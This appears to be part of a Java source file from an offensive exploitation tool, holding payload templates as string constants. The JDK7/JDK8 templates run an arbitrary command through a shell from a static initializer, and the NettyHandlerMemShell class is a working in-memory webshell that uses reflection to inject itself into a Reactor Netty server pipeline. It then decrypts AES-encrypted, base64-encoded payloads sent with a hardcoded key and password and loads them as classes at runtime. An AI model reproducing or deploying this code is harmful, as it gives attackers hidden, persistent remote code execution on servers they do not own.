            "import java.util.Scanner;\n" +
            "\n" +
            "\n" +
            "public class ExecTemplateJDK7{\n" +
            "\n" +
            "    public ExecTemplateJDK7(){\n" +
            "        try {\n" +
            "            String cmd = \"{{cmd}}\";\n" +
            "            boolean isLinux = true;\n" +
            "            String osTyp = System.getProperty(\"os.name\");\n" +
            "            if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
            "                isLinux = false;\n" +
            "            }\n" +
            "            String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
            "            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
            "            Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "static{\n" +
            "        new ExecTemplateJDK7();\n" +
            "}\n" +
            "}";
    public static String ExecTemplateJDK8 = "\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.util.Scanner;\n" +
            "\n" +
            "\n" +
            "public class ExecTemplateJDK8{\n" +
            "\n" +
            "    public ExecTemplateJDK8(){\n" +
            "        try {\n" +
            "            String cmd = \"{{cmd}}\";\n" +
            "            boolean isLinux = true;\n" +
            "            String osTyp = System.getProperty(\"os.name\");\n" +
            "            if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
            "                isLinux = false;\n" +
            "            }\n" +
            "            String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
            "            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
            "            Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "static{\n" +
            "        new ExecTemplateJDK8();\n" +
            "}\n" +
            "}";

    public static String NettyHandlerMemShell =
            "import io.netty.buffer.ByteBuf;\n" +
            "import io.netty.buffer.Unpooled;\n" +
            "import io.netty.channel.*;\n" +
            "import io.netty.handler.codec.http.*;\n" +
            "import reactor.netty.ChannelPipelineConfigurer;\n" +
            "import reactor.netty.ConnectionObserver;\n" +
            "\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.lang.reflect.Array;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.net.SocketAddress;\n" +
            "import java.net.URL;\n" +
            "import java.net.URLClassLoader;\n" +
            "import java.net.URLDecoder;\n" +
            "import java.util.AbstractMap;\n" +
            "\n" +
            "\n" +
            "public class NettyHandlerMemShell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {\n" +
            "\n" +
            "    public NettyHandlerMemShell() {\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static void doInject(Object o, String path) {\n" +
            "\n" +
            "        try {\n" +
            "            Method getThreads = Thread.class.getDeclaredMethod(\"getThreads\");\n" +
            "            getThreads.setAccessible(true);\n" +
            "            Object threads = getThreads.invoke(null);\n" +
            "\n" +
            "            for (int i = 0; i < Array.getLength(threads); i++) {\n" +
            "                Object thread = Array.get(threads, i);\n" +
            "                if (thread != null && thread.getClass().getName().contains(\"NettyWebServer\")) {\n" +
            "                    Field _val$disposableServer = thread.getClass().getDeclaredField(\"val$disposableServer\");\n" +
            "                    _val$disposableServer.setAccessible(true);\n" +
            "                    Object val$disposableServer = _val$disposableServer.get(thread);\n" +
            "                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField(\"config\");\n" +
            "                    _config.setAccessible(true);\n" +
            "                    Object config = _config.get(val$disposableServer);\n" +
            "                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField(\"doOnChannelInit\");\n" +
            "                    _doOnChannelInit.setAccessible(true);\n" +
            "                    _doOnChannelInit.set(config, new NettyHandlerMemShell());\n" +
            "\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    String xc = \"3c6e0b8a9c15224a\";\n" +
            "    String pass = \"pAS3\";\n" +
            "    String md5 = md5(pass + xc);\n" +
            "\n" +
            "    private static Class defClass(byte[] classbytes) throws Exception {\n" +
            "        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());\n" +
            "        Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "        method.setAccessible(true);\n" +
            "        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception e) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "        try {\n" +
            "            java.security.MessageDigest m;\n" +
            "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public byte[] base64Encode(byte[] bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        byte[] value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", new Class[]{null}).invoke(base64, new Object[]{null});\n" +
            "            value = (byte[]) Encoder.getClass().getMethod(\"encode\", new Class[]{\n" +
            "                    byte[].class\n" +
            "            }).invoke(Encoder, new Object[]{\n" +
            "                    bs\n" +
            "            });\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = ((String) Encoder.getClass().getMethod(\"encode\", new Class[]{\n" +
            "                        byte[].class\n" +
            "                }).invoke(Encoder, new Object[]{\n" +
            "                        bs\n" +
            "                })).getBytes();\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        byte[] value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", new Class[]{null}).invoke(base64, new Object[]{null});\n" +
            "            value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{\n" +
            "                    String.class\n" +
            "            }).invoke(decoder, new Object[]{\n" +
            "                    bs\n" +
            "            });\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{\n" +
            "                        String.class\n" +
            "                }).invoke(decoder, new Object[]{\n" +
            "                        bs\n" +
            "                });\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    private static byte[] byteMergerAll(byte[]... values) {\n" +
            "        int length_byte = 0;\n" +
            "        for (int i = 0; i < values.length; i++) {\n" +
            "            length_byte += values[i].length;\n" +
            "        }\n" +
            "        byte[] all_byte = new byte[length_byte];\n" +
            "        int countLength = 0;\n" +
            "        for (int i = 0; i < values.length; i++) {\n" +
            "            byte[] b = values[i];\n" +
            "            System.arraycopy(b, 0, all_byte, countLength, b.length);\n" +
            "            countLength += b.length;\n" +
            "        }\n" +
            "        return all_byte;\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {\n" +
            "        ChannelPipeline pipeline = channel.pipeline();\n" +
            "        pipeline.addBefore(\"reactor.left.httpTrafficHandler\", \"xxxhandler\", new NettyHandlerMemShell());\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static ThreadLocal<AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream>> requestThreadLocal = new ThreadLocal<AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream>>();\n" +
            "    private static Class payload;\n" +
            "\n" +
            "    @Override\n" +
            "    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n" +
            "\n" +
            "        if (msg instanceof HttpRequest) {\n" +
            "            HttpRequest httpRequest = (HttpRequest) msg;\n" +
            "            if (!httpRequest.headers().contains(\"tyr\")) {\n" +
            "                ctx.fireChannelRead(msg);\n" +
            "                return;\n" +
            "            }\n" +
            "            AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream> simpleEntry = new AbstractMap.SimpleEntry(httpRequest, new ByteArrayOutputStream());\n" +
            "            requestThreadLocal.set(simpleEntry);\n" +
            "        } else if (msg instanceof HttpContent) {\n" +
            "            HttpContent httpContent = (HttpContent) msg;\n" +
            "            AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream> simpleEntry = requestThreadLocal.get();\n" +
            "            if (simpleEntry == null) {\n" +
            "                return;\n" +
            "            }\n" +
            "            HttpRequest httpRequest = simpleEntry.getKey();\n" +
            "            HttpHeaders headers = httpRequest.headers();\n" +
            "            if (headers.contains(\"X-Requested-With\", \"XMLHTTPRequest\", false)) {\n" +
            "                ByteArrayOutputStream contentBuf = simpleEntry.getValue();\n" +
            "                ByteBuf byteBuf = httpContent.content();\n" +
            "                int size = byteBuf.capacity();\n" +
            "                byte[] requestContent = new byte[size];\n" +
            "                byteBuf.getBytes(0, requestContent, 0, requestContent.length);\n" +
            "                contentBuf.write(requestContent);\n" +
            "                if (httpContent instanceof LastHttpContent) {\n" +
            "                    try {\n" +
            "                        String payloadString = URLDecoder.decode(new String(contentBuf.toByteArray()));\n" +
            "                        int index = payloadString.indexOf(\"=\");\n" +
            "                        payloadString = payloadString.substring(index + 1);\n" +
            "                        byte[] data = x(base64Decode(payloadString), false);\n" +
            "                        if (payload == null) {\n" +
            "                            payload = defClass(data);\n" +
            "                        } else {\n" +
            "                            Object f = payload.newInstance();\n" +
            "                            ByteArrayOutputStream arrOut = new ByteArrayOutputStream();\n" +
            "                            f.equals(arrOut);\n" +
            "                            f.equals(data);\n" +
            "                            f.toString();\n" +
            "                            String md51 = md5.substring(0, 16);\n" +
            "                            String md52 = md5.substring(16, 32);\n" +
            "                            byte[] resp = byteMergerAll(md51.getBytes(), base64Encode(x(arrOut.toByteArray(), true)), md52.getBytes());\n" +
            "                            send(ctx, resp, HttpResponseStatus.OK);\n" +
            "                        }\n" +
            "                    } catch (Exception e) {\n" +
            "                        ctx.fireChannelRead(httpRequest);\n" +
            "                    }\n" +
            "                } else if (headers.contains(\"X-Requested-With\", \"xmlHTTPRequest\", false)) {\n" +
            "                    send(ctx, \"Success\".getBytes(), HttpResponseStatus.OK);\n" +
            "                }\n" +
            "            } else {\n" +
            "                ctx.fireChannelRead(msg);\n" +
            "            }\n" +
            "\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private void send(ChannelHandlerContext ctx, byte[] context, HttpResponseStatus status) {\n" +
            "        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));\n" +
            "        response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain; charset=UTF-8\");\n" +
            "        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n" +
            "    }\n" +
            "}";
}
